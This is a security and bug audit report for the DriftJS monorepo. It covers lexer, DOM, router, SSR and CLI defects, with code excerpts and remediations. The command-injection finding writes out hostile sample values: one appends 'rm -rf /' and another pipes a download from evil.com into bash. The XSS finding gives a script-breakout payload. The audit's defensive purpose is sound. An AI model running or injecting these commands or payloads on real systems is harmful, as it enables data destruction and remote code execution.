# DriftJS Codebase Bug Audit Report

Comprehensive evaluation of defects, correctness failures, security vulnerabilities, and efficiency bottlenecks identified across the DriftJS monorepo codebase.

**Evaluation Criteria:**
1. **Correctness** — Functional bugs, logic defects, spec mismatches, and state desynchronizations.
2. **Security** — Vulnerabilities, injection hazards, XSS vectors, and prototype pollution risks.
3. **Efficiency** — Performance bottlenecks, redundant evaluations, memory leaks, and compilation bloat.

---

## Executive Summary Matrix

| Defect ID | Category | Severity | Package / Module | Description Summary |
| :---: | :--- | :---: | :--- | :--- |
| **`BUG-01`** | **Correctness** | **High** | `driftjs-compiler` (`lexer.ts`) | Lexer prematurely closes `@if`/`@for`/`@switch` blocks on literal `}` in template text |
| **`BUG-02`** | **Correctness** | **High** | `driftjs-dom` (`index.ts`) | Empty `DocumentFragment` keys in WeakMap prevent child VM unmounting and leak teardown callbacks |
| **`BUG-03`** | **Correctness** | **High** | `driftjs-dom` (`index.ts`) | Keyed list in-place item fast-path ignores index updates for text interpolations |
| **`BUG-04`** | **Correctness** | **Medium** | `driftjs-dom` (`index.ts`) | Static global event delegation map fails across multiple documents / iframes |
| **`BUG-05`** | **Correctness** | **Medium** | `driftjs-dom` (`index.ts`) | Event handler `this` bound to internal handler dictionary instead of target DOM element |
| **`BUG-06`** | **Correctness** | **Medium** | `driftjs-router` (`RouterLink.drift`) | `RouterLink` false positive active class matching on substring path prefixes |
| **`BUG-07`** | **Correctness** | **Medium** | `driftjs-router` (`matcher.ts`) | Named route parameter replacement corrupts regexes, modifiers, and prefix names |
| **`BUG-08`** | **Correctness** | **Medium** | `driftjs-compiler` (`lexer.ts`) | Escaped `\${` in template literal strings misparsed as interpolation delimiters |
| **`BUG-09`** | **Correctness** | **Low** | `driftjs-shared` (`context.ts`) | `onUnmount` silently ignored when invoked within asynchronous callbacks |
| **`BUG-10`** | **Security** | **High** | `driftjs-ssr` (`index.ts`) | Cross-Site Scripting (XSS) via script/style tag breakout during SSR HTML serialization |
| **`BUG-11`** | **Security** | **High** | `create-drift` (`cli/src/index.ts`) | Shell Command Injection via unescaped package manager argument in `installDependencies` |
| **`BUG-12`** | **Security** | **Medium** | `driftjs-shared` (`scope.ts`) | Prototype Pollution vulnerability in `setScopeValue` via unvalidated key assignment |
| **`BUG-13`** | **Security** | **Medium** | `driftjs-ssr` (`index.ts`) | Unsanitized dynamic HTML tag names in server-side HTML serialization |
| **`BUG-14`** | **Efficiency** | **High** | `driftjs-compiler` (`generator.ts`) | Excessive code expansion (~220B/id) and redundant prototype chain walks per identifier |
| **`BUG-15`** | **Efficiency** | **Medium** | `driftjs-compiler` (`generator.ts`) | Duplicate sub-expression evaluation in `for...of` loops and destructuring assignments |
| **`BUG-16`** | **Efficiency** | **Medium** | `driftjs-router` (`matcher.ts`) | Repeated regex re-compilation and $O(N \log N)$ path re-scoring during route indexing |
| **`BUG-17`** | **Efficiency** | **Low** | `driftjs-dom` (`index.ts`) | Uncached event handler wrapper allocations on every VM execution pass |

---

## 1. Correctness Defects

### `BUG-01`: Lexer Abruptly Closes `@if`/`@for`/`@switch` Blocks on Literal `}` Characters in Data State
- **File**: [`packages/compiler/src/lexer.ts:L188-L192`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/lexer.ts#L188-L192)
- **Severity**: **High**
- **Root Cause**:
  In `DriftLexer.readDataToken()`, when scanning element body text:
  ```typescript
  if (this.peek() === '}' && this.blockDepth > 0) {
    this.advance();
    this.blockDepth--;
    return this.createToken(TokenType.BlockClose, '}', startLoc);
  }
  ```
  When the lexer is inside an active directive (e.g. `@if (cond) { ... }`), `this.blockDepth > 0`. If the template contains a literal `}` inside text content (for instance, `<p>JSON syntax: { count: 1 }</p>` or `<span>}</span>`), the lexer immediately consumes `}` as `TokenType.BlockClose` and decrements `blockDepth`. The parser then treats the directive block as closed prematurely, causing subsequent closing HTML tags (e.g. `</p>` or `</span>`) to trigger fatal parse errors (`Unexpected closing tag '</...>' without opening tag`).
- **Reproduction**:
  ```html
  @if (show) {
    <div>JSON Format: { key: 10 }</div>
  }
  ```
- **Remediation**:
  The lexer should only emit `TokenType.BlockClose` when `}` is encountered at the top level of a directive block outside element tags, or the parser should track element nesting depth so that character `}` inside element text is scanned as `TokenType.Text`.

---

### `BUG-02`: DocumentFragment WeakMap Key Invalidation Prevents Child VM Unmounting & Leaks Teardown Callbacks
- **File**: [`packages/dom/src/index.ts:L333-L354`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L333-L354), [`packages/dom/src/index.ts:L94-L111`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L94-L111)
- **Severity**: **High**
- **Root Cause**:
  In `DriftClientVM.executeLoop` under opcode `MOUNT_COMPONENT`:
  ```typescript
  const compNode = childVM.execute(compMod, { scope: propsScope, document: doc });
  if (compNode) {
    this.childVMs.set(compNode, { vm: childVM, scope: childVM.scope, propsSpec });
    this.mountedChildVMs.add(childVM);
    this.setRegister(dstReg, compNode);
  }
  ```
  When a child SFC contains multiple root nodes or `<script>` tags, `childVM.execute()` returns a `DocumentFragment` (`nodeType === 11`). `this.childVMs.set(compNode, ...)` associates the child VM with the `DocumentFragment` reference.
  However, when opcode `APPEND_CHILD` attaches `compNode` to a parent DOM element, the browser DOM engine moves all children from the fragment into the parent element, emptying the fragment.
  When the parent element is later unmounted via `unmountSubtree(node)`:
  ```typescript
  public unmountSubtree(node: Node | null): void {
    if (!node) return;
    const entry = this.childVMs.get(node);
    if (entry) {
      this.mountedChildVMs.delete(entry.vm);
      entry.vm.unmount();
      this.childVMs.delete(node);
    }
    const children = (node as any).childNodes;
    if (children) {
      for (let i = 0; i < children.length; i++) {
        this.unmountSubtree(children[i]);
      }
    }
  }
  ```
  The DOM traversal encounters the individual child nodes, none of which match the empty `DocumentFragment` key in `this.childVMs`. Consequently, `entry.vm.unmount()` is never called, `mountedChildVMs` retains the child VM, and the child's `onUnmount` callbacks and interval/event listeners are permanently leaked.
- **Remediation**:
  Store child nodes inside an array on the component entry or map all root child nodes of the fragment to the child VM in `this.childVMs`.

---

### `BUG-03`: Stale / Incorrect Index Text in Keyed List In-Place Item Fast-Path
- **File**: [`packages/dom/src/index.ts:L673-L679`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L673-L679)
- **Severity**: **High**
- **Root Cause**:
  In `REACTIVE_FOR` reconciliation:
  ```typescript
  if (itemsEqual(record.itemVal, itemVal)) {
    record.indexVal = indexVal;
    if (record.nodes.length > 0) {
      vm.patchItemAttributes(bodyMod, childScope, record.nodes[0]);
    }
    return;
  }
  ```
  When array elements are reordered, inserted at the beginning, or deleted, an item's data object identity may remain identical (`itemsEqual` is `true`), but its `indexVal` position changes.
  The fast-path branch updates `record.indexVal` and calls `patchItemAttributes()`, which exclusively updates dynamic HTML attributes on `record.nodes[0]`. It does **not** update dynamic text interpolations (`INTERPOLATE_TEXT`) inside the item that reference the loop index variable (`index` / `i`).
- **Impact**:
  Templates rendering row numbers or index-derived values (e.g. `<li>#{index + 1}: {item.name}</li>`) display stale, incorrect indices after list reordering or insertion.
- **Remediation**:
  Check if `record.indexVal !== indexVal` and trigger text interpolation updates for the row, or fall back to full row re-evaluation if the loop template references the index variable.

---

### `BUG-04`: Multi-Document & Iframe Event Delegation Failure via Static Global Listener Map
- **File**: [`packages/dom/src/index.ts:L69`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L69), [`packages/dom/src/index.ts:L233-L258`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L233-L258)
- **Severity**: **Medium**
- **Root Cause**:
  `DriftClientVM.globalDelegatedListeners` is defined as a static `Map<string, (e: Event) => void>`.
  In `ensureEventDelegated(eventName)`:
  ```typescript
  if (!DriftClientVM.globalDelegatedListeners.has(eventName)) {
    const listener = (e: Event) => { ... };
    root.addEventListener(eventName, listener, useCapture);
    DriftClientVM.globalDelegatedListeners.set(eventName, listener);
  }
  ```
  If a second VM instance is initialized in a different Document context (such as in JSDOM unit test runners, multi-window apps, iframe sandboxes, or micro-frontends), `globalDelegatedListeners.has(eventName)` returns `true` from the first document. Thus, `addEventListener` is never called on the second document, causing all delegated event handlers in that document to silently fail.
- **Remediation**:
  Track delegated listeners per `Document` root (e.g., using a `WeakMap<Document, Set<string>>`).

---

### `BUG-05`: Event Handler `this` Bound to Internal Handler Dictionary Instead of Target DOM Element
- **File**: [`packages/dom/src/index.ts:L247`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L247), [`packages/dom/src/index.ts:L409-L419`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L409-L419)
- **Severity**: **Medium**
- **Root Cause**:
  In `ensureEventDelegated`, the delegated event dispatcher invokes:
  ```typescript
  const handlers = DriftClientVM.eventHandlersMap.get(curr);
  if (handlers && handlers[eventName]) {
    handlers[eventName](e);
    break;
  }
  ```
  Because `handlers[eventName](e)` is invoked as a method of `handlers`, the `this` binding inside `wrappedHandler` becomes the plain JavaScript dictionary `{ click: fn }`.
  Inside `wrappedHandler`:
  ```typescript
  const result = val.apply(this, args);
  ```
  `val` is invoked with `this` set to the internal `handlers` object rather than the target DOM element `curr` (`e.currentTarget`).
- **Remediation**:
  Invoke `handlers[eventName].call(curr, e)` so `this` properly refers to the element that registered the event listener.

---

### `BUG-06`: `RouterLink` False Positive Active Class Matching on Substring Path Prefixes
- **File**: [`packages/router/src/components/RouterLink.drift:L22`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/components/RouterLink.drift#L22)
- **Severity**: **Medium**
- **Root Cause**:
  In `RouterLink.drift`, `computeClass()` determines if a non-exact link is active using:
  ```typescript
  if (router.resolve(to).path !== '/' && router.currentRoute.path.startsWith(router.resolve(to).path)) {
    return (customClass ? customClass + ' ' : '') + (props.activeClass || 'router-link-active');
  }
  ```
  Calling `startsWith()` without ensuring segment boundaries (`/`) causes unrelated routes that share a string prefix to be marked active. For example, if a link points to `/user`, navigating to `/users`, `/username`, or `/user-profile` will trigger `'/users'.startsWith('/user') === true` and erroneously mark the link active.
- **Remediation**:
  Verify that the path is followed by `/` or end-of-string:
  `const target = router.resolve(to).path; current.startsWith(target === '/' ? '/' : target + '/') || current === target`.

---

### `BUG-07`: Router Parameter Interpolation Corrupts Paths with Regexes or Modifiers
- **File**: [`packages/router/src/matcher.ts:L338-L343`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L338-L343)
- **Severity**: **Medium**
- **Root Cause**:
  In `createMatcher().resolve()`, named route interpolation performs naive string replacement:
  ```typescript
  for (const key of Object.keys(params)) {
    const val = params[key];
    const strVal = Array.isArray(val) ? val.join('/') : String(val);
    targetPath = targetPath.replace(`:${key}`, strVal);
  }
  ```
  When routes declare parameters with custom regexes (e.g. `/user/:id(\\d+)`) or modifiers (`:id?`, `:path*`), replacing `:id` produces `/user/123(\\d+)` or `/user/123?`, resulting in unmatchable URLs. In addition, if one parameter name is a prefix of another (e.g., `:id` and `:id_name`), `:id` will replace the prefix of `:id_name`.
- **Remediation**:
  Use regex parameter pattern matching to replace the full segment token `/:([a-zA-Z0-9_]+)(?:\\(.*\\))?[?*+]?/` with the parameter value.

---

### `BUG-08`: Escaped `\${` in Template Literal Strings Misparsed as Interpolation Delimiters
- **File**: [`packages/compiler/src/lexer.ts:L675`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/lexer.ts#L675)
- **Severity**: **Medium**
- **Root Cause**:
  In `DriftLexer.readInterpolationToken()`, when scanning template strings enclosed in backticks:
  ```typescript
  else if (inStringQuote === '`' && ch === '{' && expression.endsWith('${')) {
    templateStack.push(braceDepth);
    inStringQuote = null;
    braceDepth++;
  }
  ```
  If the source code contains an escaped template literal like `` `Price: \${amount}` ``, `expression.endsWith('${')` evaluates to `true` despite the preceding backslash `\`. The lexer incorrectly switches into expression mode inside an escaped string literal.
- **Remediation**:
  Verify that the character preceding `$` in `expression` is not an unescaped backslash `\`.

---

### `BUG-09`: `onUnmount` Silently Ignored When Invoked Within Asynchronous Callbacks
- **File**: [`packages/utils/src/context.ts:L102-L110`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/context.ts#L102-L110)
- **Severity**: **Low**
- **Root Cause**:
  `onUnmount(callback)` retrieves the active VM via `getActiveVM()`, which relies on the synchronous execution stack managed by `pushActiveVM` / `popActiveVM`.
  If `onUnmount` is called inside an asynchronous microtask, timer, or promise callback (`setTimeout`, `fetch().then()`), `getActiveVM()` returns `null`, and the unmount callback is dropped silently without an error or warning.
- **Remediation**:
  Log a diagnostic warning or throw an error when `onUnmount` is called outside synchronous component initialization.

---

## 2. Security Vulnerabilities

### `BUG-10`: Cross-Site Scripting (XSS) via Script/Style Tag Breakout in SSR HTML Serialization
- **File**: [`packages/ssr/src/index.ts:L322-L330`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L322-L330)
- **Severity**: **High** (`CWE-79: Improper Neutralization of Input During Web Page Generation`)
- **Root Cause**:
  In `serializeNode(node, isRawText)`:
  ```typescript
  export function serializeNode(node: ServerNode | string, isRawText = false): string {
    if (typeof node === 'string') return isRawText ? node : escapeHtml(node);
    if (node.type === 'text') return isRawText ? (node.content ?? '') : escapeHtml(node.content ?? '');
    ...
    if (node.type === 'element') {
      const tag = node.tag!;
      const isRaw = tag.toLowerCase() === 'script' || tag.toLowerCase() === 'style';
      ...
      const childrenStr = node.children.map((c) => serializeNode(c, isRaw)).join('');
      return `<${tag}${attrsStr}>${childrenStr}</${tag}>`;
    }
  ```
  When rendering `<script>` or `<style>` elements, `isRaw` is set to `true`, which disables HTML entity escaping for all child text nodes. If dynamic text or interpolated data within `<script>` or `<style>` contains closing tags such as `</script><script>alert(document.domain)</script>`, the server serializes the raw closing tag directly into the HTML document stream.
- **Attack Vector**:
  An attacker provides an input containing `</script><script>maliciousCode()</script>` rendered into an inline script block. When server-rendered, the browser breaks out of the original script element and executes the injected script payload.
- **Remediation**:
  Sanitize raw text blocks in SSR by escaping `</script` to `<\/script` and `</style` to `<\/style`.

---

### `BUG-11`: Shell Command Injection via Unescaped Package Manager Argument in `installDependencies`
- **File**: [`packages/cli/src/index.ts:L87-L93`](file:///home/hrutav-modha/Documents/driftjs/packages/cli/src/index.ts#L87-L93)
- **Severity**: **High** (`CWE-78: Improper Neutralization of Special Elements used in an OS Command`)
- **Root Cause**:
  In `create-drift` CLI:
  ```typescript
  export function installDependencies(targetDir: string, pm: string): void {
    console.log(`\n📦 Installing dependencies with ${pm}...\n`);
    execSync(`${pm} install`, {
      cwd: targetDir,
      stdio: 'inherit',
    });
  }
  ```
  `pm` is supplied via `options.packageManager` in `ScaffoldOptions`. `execSync` passes the concatenated string `${pm} install` directly to the system shell (`/bin/sh -c`). If `options.packageManager` contains shell metacharacters (e.g., `pnpm; rm -rf /` or `npm && curl http://evil.com/payload | bash`), arbitrary commands are executed in the host environment with full process privileges.
- **Remediation**:
  Validate `pm` against an explicit whitelist (`['npm', 'pnpm', 'yarn', 'bun']`) and invoke `execFileSync(pm, ['install'], { cwd: targetDir })` to bypass the shell interpreter.

---

### `BUG-12`: Prototype Pollution in Scope Setter (`setScopeValue`)
- **File**: [`packages/utils/src/scope.ts:L4-L26`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/scope.ts#L4-L26)
- **Severity**: **Medium** (`CWE-1321: Improperly Controlled Modification of Object Prototype Attributes`)
- **Root Cause**:
  `setScopeValue` assigns variables directly onto scope objects without checking against dangerous prototype keys:
  ```typescript
  if (!setOn) {
    targetScope[name] = val;
    setOn = targetScope;
  }
  ```
  When `name === '__proto__'`, assignment on standard prototype-inheriting objects triggers `Object.prototype.__proto__` setter, modifying the prototype chain of the scope object.
- **Remediation**:
  Reject or guard properties matching `__proto__`, `constructor`, or `prototype`:
  `if (name === '__proto__' || name === 'constructor' || name === 'prototype') return val;`.

---

### `BUG-13`: Unsanitized Dynamic HTML Tag Names in SSR Serialization
- **File**: [`packages/ssr/src/index.ts:L328-L353`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L328-L353)
- **Severity**: **Medium** (`CWE-116: Improper Encoding or Escaping of Output`)
- **Root Cause**:
  In `serializeNode`, attribute names are checked against `VALID_ATTR_NAME_REGEX`, but element tag names `tag` are interpolated directly without validation:
  ```typescript
  return `<${tag}${attrsStr}>${childrenStr}</${tag}>`;
  ```
  If a dynamically resolved component tag or AST node contains spaces or tag delimiters, it can inject arbitrary attributes or break the HTML parser structure.
- **Remediation**:
  Validate `tag` against `VALID_ATTR_NAME_REGEX` or sanitize non-alphanumeric tag names.

---

## 3. Efficiency & Performance Bottlenecks

### `BUG-14`: Massive Code Expansion & Redundant Prototype Chain Walks per Identifier in CodeGen
- **File**: [`packages/compiler/src/generator.ts:L718-L720`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L718-L720)
- **Severity**: **High**
- **Description**:
  For every variable identifier in template expressions, `astToJS` generates:
  ```javascript
  ((typeof inScopeChain === 'function' ? inScopeChain(scope, "varName") : Object.prototype.hasOwnProperty.call(scope || {}, "varName")) ? scope["varName"] : (typeof globalThis !== 'undefined' && globalThis && ("varName" in globalThis) ? globalThis["varName"] : undefined))
  ```
  - **Code Bloat**: Adds ~220 bytes of generated JavaScript per identifier. In templates with 20 expressions, this produces several kilobytes of repetitive string bytecode in the constant pool.
  - **Runtime Overhead**: During every microtask dirty-checking pass, each operand evaluation performs multiple `typeof` checks, function lookups, prototype walks (`inScopeChain`), and `globalThis` queries.
- **Remediation**:
  Emit a concise helper call `_get(scope, "varName")` passed into the compiled function wrapper parameters.

---

### `BUG-15`: Duplicate Sub-Expression Evaluations in `for...of` and Destructuring Declarations
- **File**: [`packages/compiler/src/generator.ts:L1056`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1056), [`packages/compiler/src/generator.ts:L1162-L1190`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1162-L1190)
- **Severity**: **Medium**
- **Description**:
  1. **`ForOfStatement`**:
     ```javascript
     const rightJS = `(typeof resolveIterable === 'function' ? resolveIterable(${astToJS(node.right, locals)}) : (${astToJS(node.right, locals)} || []))`;
     ```
     `astToJS(node.right, locals)` is embedded twice. If `node.right` is a function call (`getItems()`), the function executes twice per loop evaluation.
  2. **Destructuring Assignments**:
     In `VariableDeclaration` with `ObjectPattern` or `ArrayPattern` (e.g. `const { a, b, c } = getPayload()`), `valJS` is computed as `astToJS(d.init)` and duplicated into every property extractor expression. `getPayload()` is called $N$ times for $N$ destructured properties.
- **Remediation**:
  Assign the result of `node.right` / `d.init` to a temporary variable before destructuring.

---

### `BUG-16`: Repeated Regex Compilation and $O(N \log N)$ Path Re-Scoring During Route Indexing
- **File**: [`packages/router/src/matcher.ts:L277-L281`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L277-L281)
- **Severity**: **Medium**
- **Description**:
  In `createMatcher().rebuildIndex()`:
  ```typescript
  normalizedRoutes = flattened.sort((a, b) => {
    const scoreA = compilePathToRegex(a.path).score;
    const scoreB = compilePathToRegex(b.path).score;
    return scoreB - scoreA;
  });
  ```
  `compilePathToRegex` parses the path, splits segments, and compiles new `RegExp` objects on every comparison inside the sort loop. For $N$ routes, this executes $O(N \log N)$ regex compilations and path segment traversals every time `addRoute` or `removeRoute` is invoked.
- **Remediation**:
  Store the pre-computed `score` directly on `RouteRecordNormalized` during the initial `normalizeRouteRecord()` step and compare `b.score - a.score`.

---

### `BUG-17`: Uncached Event Handler Wrapper Allocations on Every VM Execution Pass
- **File**: [`packages/dom/src/index.ts:L409-L426`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L409-L426)
- **Severity**: **Low**
- **Description**:
  In `SET_ATTR` opcode execution, a new `wrappedHandler` closure and scope snapshot are instantiated and assigned to `DriftClientVM.eventHandlersMap` on every render pass, triggering unnecessary GC allocations for static event listeners.
- **Remediation**:
  Reuse stable event handler wrappers that dynamically read the latest callback from scope.
